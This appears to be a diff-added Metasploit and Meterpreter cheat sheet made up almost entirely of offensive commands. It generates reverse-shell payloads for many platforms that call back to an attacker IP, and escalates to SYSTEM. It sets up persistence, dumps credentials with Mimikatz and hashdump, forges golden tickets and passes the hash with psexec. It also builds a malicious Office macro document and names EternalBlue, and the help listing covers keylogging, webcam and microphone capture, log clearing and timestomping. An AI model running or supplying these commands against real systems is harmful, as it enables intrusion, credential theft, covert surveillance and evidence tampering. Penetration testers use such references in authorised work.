+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
+$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
+$ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
+$ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
+SYSTEM / Administrator privilege
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+Persistence Startup
+OPTIONS:
+
+-A        Automatically start a matching exploit/multi/handler to connect to the agent
+-L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
+-P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
+-S        Automatically start the agent on boot as a service (with SYSTEM privileges)
+-T <opt>  Alternate executable template to use
+-U        Automatically start the agent when the User logs on
+-X        Automatically start the agent when the system boots
+-h        This help menu
+-i <opt>  The interval in seconds between each connection attempt
+-p <opt>  The port on which the system running Metasploit is listening
+-r <opt>  The IP of the system running Metasploit listening for the connect back
+
+meterpreter > run persistence -U -p 4242
+Portforward
+portfwd add -l 7777 -r 172.17.0.2 -p 3006
+Upload / Download
+upload /path/in/hdd/payload.exe exploit.exe
+download /path/in/victim
+Execute from Memory
+execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
+Mimikatz
+load mimikatz
+mimikatz_command -f version
+mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::searchPasswords
+load kiwi
+golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
+Pass the Hash - PSExec
+msf > use exploit/windows/smb/psexec
+msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+msf exploit(psexec) > exploit
+SMBDomain             WORKGROUP                                                          no        The Windows domain to use for authentication
+SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        The password for the specified username
+SMBUser               Lambda                                                             no        The username to authenticate as
+Scripting Metasploit
+Using a .rc file, write the commands to execute, then run msfconsole -r ./file.rc. Here is a simple example to script the deployment of a handler an create an Office doc with macro.
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 4646
+set ExitOnSession false
+exploit -j -z
+
+
+use exploit/multi/fileformat/office_word_macro
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 10.10.14.22
+set LPORT 4646
+exploit
+Multiple transports
+msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
+Then, in AddTransports.ps1
+Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
+Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30
+Best of - Exploits
+    • MS17-10 Eternal Blue - exploit/windows/smb/ms17_010_eternalblue
+    • MS08_67 - exploit/windows/smb/ms08_067_netapi
+References
+    • Multiple transports in a meterpreter payload - ionize
+    • Creating Metasploit Payloads - Peleus
+
+
+    meterpreter > help
+
+    Core Commands
+    =============
+
+        Command                   Description
+        -------                   -----------
+        ?                         Help menu
+        background                Backgrounds the current session
+        bg                        Alias for background
+        bgkill                    Kills a background meterpreter script
+        bglist                    Lists running background scripts
+        bgrun                     Executes a meterpreter script as a background thread
+        channel                   Displays information or control active channels
+        close                     Closes a channel
+        detach                    Detach the meterpreter session (for http/https)
+        disable_unicode_encoding  Disables encoding of unicode strings
+        enable_unicode_encoding   Enables encoding of unicode strings
+        exit                      Terminate the meterpreter session
+        get_timeouts              Get the current session timeout values
+        guid                      Get the session GUID
+        help                      Help menu
+        info                      Displays information about a Post module
+        irb                       Open an interactive Ruby shell on the current session
+        load                      Load one or more meterpreter extensions
+        machine_id                Get the MSF ID of the machine attached to the session
+        migrate                   Migrate the server to another process
+        pivot                     Manage pivot listeners
+        pry                       Open the Pry debugger on the current session
+        quit                      Terminate the meterpreter session
+        read                      Reads data from a channel
+        resource                  Run the commands stored in a file
+        run                       Executes a meterpreter script or Post module
+        secure                    (Re)Negotiate TLV packet encryption on the session
+        sessions                  Quickly switch to another session
+        set_timeouts              Set the current session timeout values
+        sleep                     Force Meterpreter to go quiet, then re-establish session
+        ssl_verify                Modify the SSL certificate verification setting
+        transport                 Manage the transport mechanisms
+        use                       Deprecated alias for "load"
+        uuid                      Get the UUID for the current session
+        write                     Writes data to a channel
+
+
+    Stdapi: File system Commands
+    ============================
+
+        Command       Description
+        -------       -----------
+        cat           Read the contents of a file to the screen
+        cd            Change directory
+        checksum      Retrieve the checksum of a file
+        cp            Copy source to destination
+        del           Delete the specified file
+        dir           List files (alias for ls)
+        download      Download a file or directory
+        edit          Edit a file
+        getlwd        Print local working directory
+        getwd         Print working directory
+        lcd           Change local working directory
+        lls           List local files
+        lpwd          Print local working directory
+        ls            List files
+        mkdir         Make directory
+        mv            Move source to destination
+        pwd           Print working directory
+        rm            Delete the specified file
+        rmdir         Remove directory
+        search        Search for files
+        show_mount    List all mount points/logical drives
+        upload        Upload a file or directory
+
+
+    Stdapi: Networking Commands
+    ===========================
+
+        Command       Description
+        -------       -----------
+        arp           Display the host ARP cache
+        getproxy      Display the current proxy configuration
+        ifconfig      Display interfaces
+        ipconfig      Display interfaces
+        netstat       Display the network connections
+        portfwd       Forward a local port to a remote service
+        resolve       Resolve a set of host names on the target
+        route         View and modify the routing table
+
+
+    Stdapi: System Commands
+    =======================
+
+        Command       Description
+        -------       -----------
+        clearev       Clear the event log
+        drop_token    Relinquishes any active impersonation token.
+        execute       Execute a command
+        getenv        Get one or more environment variable values
+        getpid        Get the current process identifier
+        getprivs      Attempt to enable all privileges available to the current process
+        getsid        Get the SID of the user that the server is running as
+        getuid        Get the user that the server is running as
+        kill          Terminate a process
+        localtime     Displays the target system local date and time
+        pgrep         Filter processes by name
+        pkill         Terminate processes by name
+        ps            List running processes
+        reboot        Reboots the remote computer
+        reg           Modify and interact with the remote registry
+        rev2self      Calls RevertToSelf() on the remote machine
+        shell         Drop into a system command shell
+        shutdown      Shuts down the remote computer
+        steal_token   Attempts to steal an impersonation token from the target process
+        suspend       Suspends or resumes a list of processes
+        sysinfo       Gets information about the remote system, such as OS
+
+
+    Stdapi: User interface Commands
+    ===============================
+
+        Command        Description
+        -------        -----------
+        enumdesktops   List all accessible desktops and window stations
+        getdesktop     Get the current meterpreter desktop
+        idletime       Returns the number of seconds the remote user has been idle
+        keyboard_send  Send keystrokes
+        keyevent       Send key events
+        keyscan_dump   Dump the keystroke buffer
+        keyscan_start  Start capturing keystrokes
+        keyscan_stop   Stop capturing keystrokes
+        mouse          Send mouse events
+        screenshare    Watch the remote user desktop in real time
+        screenshot     Grab a screenshot of the interactive desktop
+        setdesktop     Change the meterpreters current desktop
+        uictl          Control some of the user interface components
+
+
+    Stdapi: Webcam Commands
+    =======================
+
+        Command        Description
+        -------        -----------
+        record_mic     Record audio from the default microphone for X seconds
+        webcam_chat    Start a video chat
+        webcam_list    List webcams
+        webcam_snap    Take a snapshot from the specified webcam
+        webcam_stream  Play a video stream from the specified webcam
+
+
+    Stdapi: Audio Output Commands
+    =============================
+
+        Command       Description
+        -------       -----------
+        play          play a waveform audio file (.wav) on the target system
+
+
+    Priv: Elevate Commands
+    ======================
+
+        Command       Description
+        -------       -----------
+        getsystem     Attempt to elevate your privilege to that of local system.
+
+
+    Priv: Password database Commands
+    ================================
+
+        Command       Description
+        -------       -----------
+        hashdump      Dumps the contents of the SAM database
+
+
+    Priv: Timestomp Commands
+    ========================
+
+        Command       Description
+        -------       -----------
+        timestomp     Manipulate file MACE attributes
